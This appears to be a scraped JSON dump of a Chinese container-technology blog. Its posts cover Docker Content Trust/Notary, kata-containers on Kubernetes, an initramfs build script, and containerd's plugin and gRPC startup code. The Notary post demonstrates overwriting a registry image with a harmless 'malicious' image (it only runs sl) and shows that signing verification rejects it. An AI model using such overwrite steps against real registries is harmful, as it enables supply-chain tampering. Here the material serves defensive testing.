恶意用户上传恶意镜像，覆盖ubuntu:18.04 先使用如下Dockerfile制作一个恶意image：\n1FROM localhost:5000/test/ubuntu:18.04 2 3MAINTAINER black-hat 4RUN apt update \u0026amp;\u0026amp; apt install -y sl 5CMD [\u0026#34;/usr/games/sl\u0026#34;] 制作image的命令：\n1$ docker build -t ubuntu:evil . 这个镜像run起来之后会有一个小火车跑过:-)\n我们切换一个账户，尝试用普通账户签名并且覆盖原先的ubuntu:18.04\n1$ su - test 2$ export REGISTRY=localhost:5000 3$ export DOCKER_CONTENT_TRUST=1 4$ export DOCKER_CONTENT_TRUST_SERVER=https://localhost:4443 5$ docker tag ubuntu:evil $REGISTRY/test/ubuntu:18.04 6$ docker push $REGISTRY/test/ubuntu:18.04 7The push refers to repository [localhost:5000/test/ubuntu] 80f5d6ef7110f: Pushed 98d267010480f: Layer already exists 10270f934787ed: Layer already exists 1102571d034293: Layer already exists 1218.04: digest: sha256:8ff78797f8ce02027d187f3a0c27502e134aa18163c62e110001e11b1a95b36d size: 1155 13Signing and pushing trust metadata 14ERRO[0002] couldn\u0026#39;t add target to targets: could not find necessary signing keys, at least one of these keys must be available: 5e28dcaf218a140b6eeb8af239c2c44a2fbc7103d41759b5bc7aeaa3b7a5ec4e 15failed to sign localhost:5000/test/ubuntu:18.04: could not find necessary signing keys, at least one of these keys must be available: 5e28dcaf218a140b6eeb8af239c2c44a2fbc7103d41759b5bc7aeaa3b7a5ec4e 可以看到由于这个用户由于没有合法的密钥，是无法给image做签名的。但是镜像上传成功了。这部分理论上应该有registry的身份认证拦截。\n我们切换回root用户，把本地镜像删除了，禁用content trust之后再来试一次。\n1$ sudo su 2$ docker rmi -f `docker images ubuntu:evil -q` 3$ docker rmi -f `docker images $REGISTRY/test/ubuntu -q` 4$ export DOCKER_CONTENT_TRUST=0 5$ docker run -ti $REGISTRY/test/ubuntu:18.04 可以看到小火车跑过，证明本地的image下载的是恶意的。\n重新删除，然后再带Content Trust试一下。\n1$ docker rmi -f `docker images $REGISTRY/test/ubuntu -q` 2$ export DOCKER_CONTENT_TRUST=1 3$ docker pull $REGISTRY/test/ubuntu:18.04 4## docker pull $REGISTRY/test/ubuntu:18.04 5No valid trust data for 18.04 可见这个image已经不被信任了，无法pull和运行非法image。\n3.5 docker content trust的问题 镜像是先与Registry打交道后存储签名，如果是恶意image覆盖的问题，会导致恶意image上传上去了，但是签名没有更新/被删除的问题，导致image和notary签名数据不一致。需要加事务来解决？ 密钥的存储必须与KMS结合起来，这样就不能直接使用docker+notary的解决方案了，预计要重新实现docker client的签名和验证功能? ","link":"https://weizhang555.github.io/original/notary-intro/","section":"original","tags":["容器","安全"],"title":"Docker官方镜像签名方案：Notary"},{"body":"本文介绍下如何创建kata的k8s集群， kata项目链接：https://github.com/kata-containers kata是什么不介绍了，能看到这篇文章的相信对kata都已经有一定了解了。\n本文参考了官方的安装说明： https://github.com/kata-containers/documentation/blob/master/how-to/how-to-use-k8s-with-cri-containerd-and-kata.md 实际上仅仅安装没有什么好讲的，文档里讲的很清楚了。但是在我们恶劣的大网络环境下，就变得有点技巧了。\n以下为正文\n安装环境 Virtual Machine:\nOS: Ubuntu 18.04\nCPU: 4\nMemory: 8G\n在虚拟化环境中，务必保证嵌套虚拟化打开。\n虚拟化软件必须要支持 可以在guest OS里面通过以下命令检查：\n1$ sudo grep -E \u0026#34;(vmx|svm)\u0026#34; --color=always /proc/cpuinfo 如果没有显示则不支持硬件虚拟化。需要打开相应的虚拟化选项，如果是物理机则需要bios里面启用虚拟化支持。\n启动kvm_intel的嵌套虚拟化支持 1# modprobe -r kvm_intel 2# modprobe kvm_intel nested=1 安装kata-containers 参考：\nhttps://github.com/kata-containers/documentation/blob/master/install/ubuntu-installation-guide.md\n运行以下命令：\n1$ sudo sh -c \u0026#34;echo \u0026#39;deb http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_$(lsb_release -rs)/ /\u0026#39; \u0026gt; /etc/apt/sources.list.d/kata-containers.list\u0026#34; 2$ curl -sL http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_$(lsb_release -rs)/Release.key | sudo apt-key add - 3$ sudo -E apt-get update 4$ sudo -E apt-get -y install kata-runtime kata-proxy kata-shim 安装docker 参考：\nhttps://github.com/kata-containers/documentation/blob/master/install/docker/ubuntu-docker-install.md\n实际上在本文写成之时，k8s+docker+kata的路子还没走通，必须依赖一个将annotation透传的补丁：\nPR: https://github.com/moby/moby/pull/37289\ndocker公司一向强势，这个pr虽然很有用，但是也不知道还要多久才会被合入。\n所以本文运行kata的k8s集群使用的是cri-containerd而不是docker。\n不过笔者仍然建议先安装docker，来尝试kata-containers。你可以简单的运行以下命令：\n1$ docker run -ti --runtime kata busybox sh 2# 运行成功后可以通过 ps -ef | grep qemu 来查看kata-containers后台对应的qemu进程。\n安装cri-containerd 参考： https://github.com/containerd/cri/blob/master/docs/installation.md\nstep 0: 安装依赖 1$ sudo apt-get update 2$ sudo apt-get install libseccomp2 step 1: 下载containerd的tar包： 1export VERSION=1.1.2 2$ wget https://storage.googleapis.com/cri-containerd-release/cri-containerd-${VERSION}.linux-amd64.tar.gz 这一步就要用到翻墙大法了，翻墙流量也会费钱的，所以给大家提供个网盘链接吧：\n安装cni插件 这里简化一下，使用标准的cni插件。\n参考： https://github.com/containernetworking/cni\n1$ git clone https://github.com/containernetworking/plugins 2$ cd plugins 3$ ./build.sh 4$ mkdir -p /etc/cni/net.d 5$ cat \u0026gt;/etc/cni/net.d/10-mynet.conf \u0026lt;\u0026lt;EOF 6{ 7\t\u0026#34;cniVersion\u0026#34;: \u0026#34;0.2.0\u0026#34;, 8\t\u0026#34;name\u0026#34;: \u0026#34;mynet\u0026#34;, 9\t\u0026#34;type\u0026#34;: \u0026#34;bridge\u0026#34;, 10\t\u0026#34;bridge\u0026#34;: \u0026#34;cni0\u0026#34;, 11\t\u0026#34;isGateway\u0026#34;: true, 12\t\u0026#34;ipMasq\u0026#34;: true, 13\t\u0026#34;ipam\u0026#34;: { 14\t\u0026#34;type\u0026#34;: \u0026#34;host-local\u0026#34;, 15\t\u0026#34;subnet\u0026#34;: \u0026#34;10.22.0.0/16\u0026#34;, 16\t\u0026#34;routes\u0026#34;: [ 17\t{ \u0026#34;dst\u0026#34;: \u0026#34;0.0.0.0/0\u0026#34; } 18\t] 19\t} 20} 21EOF 22$ cat \u0026gt;/etc/cni/net.d/99-loopback.conf \u0026lt;\u0026lt;EOF 23{ 24\t\u0026#34;cniVersion\u0026#34;: \u0026#34;0.2.0\u0026#34;, 25\t\u0026#34;name\u0026#34;: \u0026#34;lo\u0026#34;, 26\t\u0026#34;type\u0026#34;: \u0026#34;loopback\u0026#34; 27} 28EOF ","link":"https://weizhang555.github.io/original/create-k8s-cluster-with-kata/","section":"original","tags":["容器","K8s"],"title":"创建kata的K8s集群"},{"body":"通过自己制作initramfs可以使用qemu启动自定义的内核， 可以用于调试或测试。这里记录一下制作简单的initramfs的脚本， 方便后续使用。\n本文参考了链接：Building a minimal Linux / Busybox OS for Qemu\n完整脚本如下：\n1#!/bin/bash 2set -e 3 4CWD=`pwd` 5BUSYBOX_FILE=busybox-1.28.1 6BUSYBOX_SRC=/tmp/busybox 7BUSYBOX_BUILD=/tmp/busybox-build 8INITRAMFS_DIR=/tmp/initramfs 9 10mkdir -p $BUSYBOX_SRC $BUSYBOX_BUILD $INITRAMFS_DIR 11if [ ! -e $BUSYBOX_FILE ]; then 12 wget http://busybox.net/downloads/${BUSYBOX_FILE}.tar.bz2 13fi 14tar -C $BUSYBOX_SRC -xvf ${BUSYBOX_FILE}.tar.bz2 15 16cd ${BUSYBOX_SRC}/${BUSYBOX_FILE} \u0026amp;\u0026amp; make O=${BUSYBOX_BUILD} defconfig 17# enable busybox static build 18cd ${BUSYBOX_BUILD} \u0026amp;\u0026amp; sed -i \u0026#34;s/# CONFIG_STATIC is not set/CONFIG_STATIC=y/\u0026#34; .config \\ 19 \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install 20 21cd $INITRAMFS_DIR \u0026amp;\u0026amp; rm -rfv * \u0026amp;\u0026amp; mkdir -p bin sbin etc proc sys usr/bin usr/sbin \\ 22 \u0026amp;\u0026amp; cp -a $BUSYBOX_BUILD/_install/* . 23 24# if you want to add iozone binary and its linked .so, you can add command here: 25# cp iozone $INITRAMFS_DIR/bin 26 27cat \u0026gt; $INITRAMFS_DIR/init \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; 28#!/bin/sh 29 30mount -t proc none /proc 31mount -t sysfs none /sys 32 33cat \u0026lt;\u0026lt;! 34 35 36Boot took $(cut -d\u0026#39; \u0026#39; -f1 /proc/uptime) seconds 37 38 _ _ __ _ 39 /\\/\\ (_)_ __ (_) / /(_)_ __ _ ___ __ 40 / \\| | \u0026#39;_ \\| | / / | | \u0026#39;_ \\| | | \\ \\/ / 41/ /\\/\\ \\ | | | | | / /__| | | | | |_| |\u0026gt; \u0026lt; 42\\/ \\/_|_| |_|_| \\____/_|_| |_|\\__,_/_/\\_\\ 43 44 45Welcome to mini_linux 46 47 48! 49exec /bin/sh 50EOF 51 52chmod +x init 53 54# package into a initramfs 55rm -fv /tmp/initramfs.cpio.gz || true 56find . -print0 | cpio --null -ov --format=newc \\ 57 | gzip -9 \u0026gt; /tmp/initramfs.cpio.gz 58 59echo \u0026#34;===========\u0026gt; initramfs is saved as /tmp/initramfs.cpio.gz\u0026#34; 60 61cd ${CWD} 62# boot with qemu 63# sudo qemu-system-x86_64 -enable-kvm -kernel build/kernel -initrd initramfs.cpio.gz -nographic -append \u0026#34;console=ttyS0\u0026#34; ","link":"https://weizhang555.github.io/original/make-initramfs-for-qemu-start/","section":"original","tags":["内核"],"title":"Kernel调试基础--制作initramfs"},{"body":"","link":"https://weizhang555.github.io/tags/kata/","section":"tags","tags":null,"title":"Kata"},{"body":"最近在51cto举办的meetup上做了关于Kata Containers的演讲， KataContainers是github上的新项目，前身是Intel的clear container和Hyper的runv， 融合了普通容器的轻快和虚拟机的高隔离高安全性的优点。\n详细可以直接参观Kata Containers的github主页： https://github.com/kata-containers/runtime\n演讲的链接传送门：http://developer.huawei.com/ict/forum/thread-48823.html\n完整的演讲ppt可以在此处下载： Kata介绍与Huawei_iSula安全容器-张伟.ppt\n","link":"https://weizhang555.github.io/original/kata-containers-introduction/","section":"original","tags":["容器","安全","Kata"],"title":"Kata Containers介绍，附上演讲ppt"},{"body":"1. 简介 containerd是与docker直接沟通的下属组件，详细是什么不说了。 每个docker daemon启动的时候都会启动一个containerd daemon，启动容器的时候， 每个容器的init进程／exec进程都会对应一个containerd-shim进程， containerd-shim同样是containerd库里面单独的一个二进制程序， containerd-shim会调用runc最终启动容器。 这些基本的知识一笔带过不详细展开。\n随着docker改名为moby，docker的大部分功能，比如image管理，容器运行都会下沉到containerd， docker会越来越侧重于编排调度部分--swarm。\n简单分析下containerd的代码架构，作为官方containerd文档的一个补充。 本篇以git commit d700a9c35b09239c8c056cd5df73bc19a79db9a9 为标准讲解。\n2. grpc containerd的架构极其依赖grpc协议。\n1# ls api/services/ 2containers content diff events images namespaces snapshot tasks version api/services目录下存放着containerd提供的不同服务对应的grpc接口。 以比较基础的content服务为例，\n1# ls api/services/content/v1/ 2content.pb.go content.proto 下面一共有两个文件，一个content.proto一个是.pb.go, 其中用户只需要定义content.proto文件， 而程序最终使用的content.pb.go则可以由grpc命令自动生成。 containerd在Makefile中提供了生成.pb.go的指令\n1// 安装依赖的库 2# cd containerd \u0026amp;\u0026amp; make setup 3# make protos 打开content.proto 来看，里面主要定义了一个service：\n113 service Content { 2 14 // Info returns information about a committed object. 3 15 // 4 16 // This call can be used for getting the size of content and checking for 5 17 // existence. 6 18 rpc Info(InfoRequest) returns (InfoResponse); 7 19 8 20 // Update updates content metadata. 9 21 // 10 22 // This call can be used to manage the mutable content labels. The 11 23 // immutable metadata such as digest, size, and committed at cannot 12 24 // be updated. 13 25 rpc Update(UpdateRequest) returns (UpdateResponse); 14 26 15 27 // List streams the entire set of content as Info objects and closes the 16 28 // stream. 17 29 // 18 30 // Typically, this will yield a large response, chunked into messages. 19 31 // Clients should make provisions to ensure they can handle the entire data 20 32 // set. 21 33 rpc List(ListContentRequest) returns (stream ListContentResponse); 22 34 23 35 // Delete will delete the referenced object. 24 36 rpc Delete(DeleteContentRequest) returns (google.protobuf.Empty); 25...省略... 以及很多message结构体，message可以理解成是service定义的接口使用到的结构体，是通信的结构化的数据流。\n使用protoc命令生成的.pb.go文件内同步包含server端和client端的接口实现。\n3. containerd启动 以containerd启动过程来看。入口为cmd/containerd/main.go, 程序一启动首先就把信号处理函数准备好了。\n1cmd/containerd/main.go: 2 85 done := handleSignals(ctx, signals, serverC) 3 86 // start the signal handler as soon as we can to make sure that 4 87 // we don\u0026#39;t miss any signals during boot 5 88 signal.Notify(signals, handledSignals...) 后面都是准备并启动grpc server。核心是准备server的这一句\n1cmd/containerd/main.go: 2106\tserver, err := server.New(ctx, config) 进去来看server.New的实现。\n前面都是创建目录，主要看加载plugin的部分。\n3.1. load plugins 1server/server.go: 2func New(ctx context.Context, config *Config) (*Server, error): 3 452 plugins, err := loadPlugins(config) 核心代码：\n1162 func loadPlugins(config *Config) ([]*plugin.Registration, error) { 2163 // load all plugins into containerd 3164 if err := plugin.Load(filepath.Join(config.Root, \u0026#34;plugins\u0026#34;)); err != nil { 4165 return nil, err 5166 } 6167 // load additional plugins that don\u0026#39;t automatically register themselves 7168 plugin.Register(\u0026amp;plugin.Registration{ 8169 Type: plugin.ContentPlugin, // \u0026#34;io.containerd.content.v1\u0026#34; 9170 ID: \u0026#34;content\u0026#34;, 10171 Init: func(ic *plugin.InitContext) (interface{}, error) { 11172 return local.NewStore(ic.Root) 12173 }, 13174 }) 14175 plugin.Register(\u0026amp;plugin.Registration{ 15176 Type: plugin.MetadataPlugin, // \u0026#34;io.containerd.metadata.v1\u0026#34; 16177 ID: \u0026#34;bolt\u0026#34;, 17178 Init: func(ic *plugin.InitContext) (interface{}, error) { 18179 if err := os.MkdirAll(ic.Root, 0711); err != nil { 19180 return nil, err 20181 } 21182 return bolt.Open(filepath.Join(ic.Root, \u0026#34;meta.db\u0026#34;), 0644, nil) 22183 }, 23184 }) 24185 25186 // return the ordered graph for plugins 26187 return plugin.Graph(), nil 27188 } 164行进入plugin包，内部实现是golang从1.8（？）开始支持的新特性--go语言自带的plugin支持， 可以加载用户自定义的插件。\n168和175是注册了两个最基本的插件，一个是content插件，一个是metadata插件，这两个插件基本上是其他插件的基础。 其中content插件主要是依赖content/local那个子package，metadata主要是操纵boltdb数据库meta.db\n1root@ubuntu:~/gocode/src/github.com/containerd/containerd# ls /var/lib/containerd/ 2io.containerd.content.v1.content io.containerd.runtime.v1.linux io.containerd.snapshotter.v1.overlayfs 3io.containerd.metadata.v1.bolt io.containerd.snapshotter.v1.btrfs 4root@ubuntu:~/gocode/src/github.com/containerd/containerd# ls /var/lib/containerd/io.containerd.metadata.v1.bolt/ 5meta.db plugin.Register函数其实很简单，就是把某个Registration结构体加入到plugin包的register全局结构体内：\n1 59 var register = struct { 2 60 sync.Mutex 3 61 r []*Registration 4 62 }{} 上面的r即承载着所有的Registration结构体。\n上文中提到的loadPlugins最后return plugin.Graph()同样定义在plugin包里， 里面根据Registration.Requires对所有Registration进行了排序， 给出了一个按依赖关系排序的插件数组。比方说plugin a, b, c, 其中b定义了requires a, c定义了requires b, 那么最终给出的排序的插件数组就是[a, b, c] 而不是[b, a, c]或其他。\n但是Registration难道只有两个吗？两个插件为什么需要这么复杂？ 答案是当然不是只有两个，还有其他的插件，只是他们初始化过程比较隐晦，不是那么直观。\n3.2. 其他插件在哪儿？ 答案是在以下两个文件中：\n1cmd/containerd/builtins.go: 2 3 // register containerd builtins here 3 4 import ( 4 5 _ \u0026#34;github.com/containerd/containerd/differ\u0026#34; 5 6 _ \u0026#34;github.com/containerd/containerd/services/containers\u0026#34; 6 7 _ \u0026#34;github.com/containerd/containerd/services/content\u0026#34; 7 8 _ \u0026#34;github.com/containerd/containerd/services/diff\u0026#34; 8 9 _ \u0026#34;github.com/containerd/containerd/services/events\u0026#34; 9 10 _ \u0026#34;github.com/containerd/containerd/services/healthcheck\u0026#34; 10 11 _ \u0026#34;github.com/containerd/containerd/services/images\u0026#34; 11 12 _ \u0026#34;github.com/containerd/containerd/services/namespaces\u0026#34; 12 13 _ \u0026#34;github.com/containerd/containerd/services/snapshot\u0026#34; 13 14 _ \u0026#34;github.com/containerd/containerd/services/tasks\u0026#34; 14 15 _ \u0026#34;github.com/containerd/containerd/services/version\u0026#34; 15 16 ) 以及(以linux平台为例，其他平台的文件见其他后缀文件)：\n1cmd/containerd/builtins_linux.go: 2 3 import ( 3 4 _ \u0026#34;github.com/containerd/containerd/linux\u0026#34; 4 5 _ \u0026#34;github.com/containerd/containerd/metrics/cgroups\u0026#34; 5 6 _ \u0026#34;github.com/containerd/containerd/snapshot/overlay\u0026#34; 6 7 ) 其中import _ \u0026quot;xxx\u0026quot; 就代表着只执行这个包的init函数，但是不使用这个包的任何函数。\n以services/content为例：\n1services/content/service.go: 2 38 func init() { 3 39 plugin.Register(\u0026amp;plugin.Registration{ 4 40 Type: plugin.GRPCPlugin, // \u0026#34;io.containerd.grpc.v1\u0026#34; 5 41 ID: \u0026#34;content\u0026#34;, 6 42 Requires: []plugin.PluginType{ 7 43 plugin.ContentPlugin, 8 44 plugin.MetadataPlugin, 9 45 }, 10 46 Init: NewService, 11 47 }) 12 48 } init()函数是golang的基本用法，会在这个package被引用到的时候自动初始化执行。 这里就是注册了另一个plugin. 需要注意的是，plugin.GRPCPlugin这个类型的插件有不止一种，一般都是通过grpc service对外提供服务的。 在上面提到的import的其他包里，你可以找到很多GRPCPlugin类型的插件。 这个插件依赖于plugin.ContentPlugin和plugin.MetadataPlugin， 也就是说初始化过程中，一定会先初始化它依赖的ContentPlugin和MetadataPlugin再初始化它。 Init函数指向NewService这个函数。这个函数本文后面会继续打开来看，我们先暂停到这里。 到此，我们知道了所有plugin都是在哪里找到的。\n3.3. 注册和启动service 继续回到server.New的实现中，loadPlugins完成之后，所有的plugin都加入到plugins这个数组中了， 下一步就是处理这个数组。下面是一段长长的代码：\n1server/server.go: 2func New(ctx context.Context, config *Config) (*Server, error): 3 4 68 for _, p := range plugins { 5 69 id := p.URI() // fmt.Sprintf(\u0026#34;%s.%s\u0026#34;, r.Type, r.ID) 6 70 log.G(ctx).WithField(\u0026#34;type\u0026#34;, p.Type).Infof(\u0026#34;loading plugin %q...\u0026#34;, id) 7 71 8 72 initContext := plugin.NewContext( 9 73 ctx, 10 74 initialized, 11 75 config.Root, // 默认是\u0026#34;/var/lib/containerd\u0026#34; 12 76 config.State, // 默认是\u0026#34;/run/containerd\u0026#34; 13 77 id, 14 78 ) 15 79 initContext.Events = s.events 16 80 initContext.Address = config.GRPC.Address // 默认是\u0026#34;/run/containerd/containerd.sock\u0026#34; 17 81 18 82 // load the plugin specific configuration if it is provided 19 83 if p.Config != nil { 20 84 pluginConfig, err := config.Decode(p.ID, p.Config) 21 85 if err != nil { 22 86 return nil, err 23 87 } 24 88 initContext.Config = pluginConfig 25 89 } 26 90 instance, err := p.Init(initContext) 27 91 if err != nil { 28 92 if plugin.IsSkipPlugin(err) { 29 93 log.G(ctx).WithField(\u0026#34;type\u0026#34;, p.Type).Infof(\u0026#34;skip loading plugin %q...\u0026#34;, id) 30 94 } else { 31 95 log.G(ctx).WithError(err).Warnf(\u0026#34;failed to load plugin %s\u0026#34;, id) 32 96 } 33 97 continue 34 98 } 35 99 36100 if types, ok := initialized[p.Type]; ok { 37101 types[p.ID] = instance 38102 } else { 39103 initialized[p.Type] = map[string]interface{}{ 40104 p.ID: instance, 41105 } 42106 } 43107 // check for grpc services that should be registered with the server 44108 if service, ok := instance.(plugin.Service); ok { 45109 services = append(services, service) 46110 } 47111 } 48112 // register services after all plugins have been initialized 49113 for _, service := range services { 50114 if err := service.Register(rpc); err != nil { 51115 return nil, err 52116 } 53117 } 90行之前都是准备initContext，这个initContext是会传递给每个plugin的Init函数使用的一个初始化数据。 随后重点是90行，会调用每个plugin的Init函数，入参为刚才准备的initContext。 initialized数组每一轮迭代都会把当前初始化完成的插件放进去，然后传递给下一个plugin的initContext作为初始化必须的数据， 下一个插件就可以访问它所依赖的任何一个组件了。\n108行需要注意的是，每个插件执行完Init函数所返回的instance interface，都会尝试去转换成plugin.Service接口， 如果它实现了plugin.Service这个接口，那么它就是一个service，需要加到services列表， 等待最后在114行执行Register函数进行注册。\n1plugin/plugin.go: 2 55 type Service interface { 3 56 Register(*grpc.Server) error 4 57 } 也即是说，只要instance实现了Register接口，就是一个服务。\n仍然以content service为例。\n1services/content/service.go: 2 38 func init() { 3 39 plugin.Register(\u0026amp;plugin.Registration{ 4 40 Type: plugin.GRPCPlugin, 5 41 ID: \u0026#34;content\u0026#34;, 6 42 Requires: []plugin.PluginType{ 7 43 plugin.ContentPlugin, 8 44 plugin.MetadataPlugin, 9 45 }, 10 46 Init: NewService, 11 47 }) 12 48 } 13 49 14 50 func NewService(ic *plugin.InitContext) (interface{}, error) { 15 51 c, err := ic.Get(plugin.ContentPlugin) 16 52 if err != nil { 17 53 return nil, err 18 54 } 19 55 m, err := ic.Get(plugin.MetadataPlugin) 20 56 if err != nil { 21 57 return nil, err 22 58 } 23 59 cs := metadata.NewContentStore(m.(*bolt.DB), c.(content.Store)) 24 60 return \u0026amp;Service{ 25 61 store: cs, 26 62 publisher: ic.Events, 27 63 }, nil 28 64 } 29 65 30 66 func (s *Service) Register(server *grpc.Server) error { 31 67 api.RegisterContentServer(server, s) 32 68 return nil 33 69 } 可以看到content plugin的Init函数返回了content.Service结构体，这个结构体实现了Register函数， 它是一个service。 其中67行会跳转到以下：\n1api/services/content/v1/content.pb.go: 2 619 // Server API for Content service 3 620 4 621 type ContentServer interface { 5 622 // Info returns information about a committed object. 6 623 // 7 624 // This call can be used for getting the size of content and checking for 8 625 // existence. 9 626 Info(context.Context, *InfoRequest) (*InfoResponse, error) 10 627 // Update updates content metadata. 11 628 // 12 629 // This call can be used to manage the mutable content labels. The 13 630 // immutable metadata such as digest, size, and committed at cannot 14 631 // be updated. 15 632 Update(context.Context, *UpdateRequest) (*UpdateResponse, error) 16 633 // List streams the entire set of content as Info objects and closes the 17 634 // stream. 18 635 // 19 636 // Typically, this will yield a large response, chunked into messages. 20 637 // Clients should make provisions to ensure they can handle the entire data 21 638 // set. 22 639 List(*ListContentRequest, Content_ListServer) error 23 640 // Delete will delete the referenced object. 24 641 Delete(context.Context, *DeleteContentRequest) (*google_protobuf3.Empty, error) 25...省略... 26 27 677 func RegisterContentServer(s *grpc.Server, srv ContentServer) { 28 678 s.RegisterService(\u0026amp;_Content_serviceDesc, srv) 29 679 } 也就是content.Service必须是ContentServer的一个实现。\n下面一句划重点：\napi/services包定义了所有用户自定义的grpc服务的接口，其中.proto文件包含了用户自定义的service接口， 而.pb.go是protoc自动生成的service定义，包含server端和client端定义；services/包里实现了api/services/用户定义的接口\napi/services包含的是接口定义，services包是实现。\n在上文中services/content/service.go包含了content service的server端实现，而services/content/store.go对client端做了封装， 更加便于使用。\n4. 总结 上文对containerd的启动流程做了总结，主要是围绕containerd如何启动多个grpc service给出分析的。grpc可以说是containerd的实现核心， 与docker daemon的http restful API还是有较大不同。后续会针对部分单独的组件再来做分析。\ncontainerd源码分析xmind文件\n","link":"https://weizhang555.github.io/original/containerd-code-analysis/","section":"original","tags":["容器"],"title":"containerd源码阅读(1)--框架篇"},{"body":"runc是docker的核心底层依赖，是容器运行的runtime，目前所属的仓库是opencontainers/runc, 是docker将原先的libcontainer模块独立出来，并贡献给oci社区的产物。\n一直想写一下runc的源码分析，但是一直没有时间。暂时先把自己阅读runc过程中画得xmind思维脑图放出来吧， 里面的内容是runc的代码流程分析。有时间再回来补齐源码分析。\nrunc源码分析xmind文件\n","link":"https://weizhang555.github.io/original/runc-code-analysis/","section":"original","tags":["容器"],"title":"runc源码阅读"},{"body":"一位热爱生活，热爱coding的普通人。\n联系我 Email: zhangwei_cs@qq.com\nWeChat(微信):\n","link":"https://weizhang555.github.io/about/","section":"","tags":null,"title":"关于我"},{"body":"之前也在其他地方开过博客，每次都坚持不了多久，零零散散写一些，回头看一下没多少有价值的东西。 这次搬家到github pages上面，算是个新的开始，旧的东西就随风而去吧，不带过来了。\n从今天开始，尽量腾点时间，多写点技术文章，不在乎长度，不必刻意追求深度，尽量多留下点东西。\n目前在研究容器领域的东西，就多写点docker容器相关的文章吧。\n共勉。\n","link":"https://weizhang555.github.io/original/start/","section":"original","tags":["随笔"],"title":"起个头"},{"body":"","link":"https://weizhang555.github.io/series/","section":"series","tags":null,"title":"Series"}]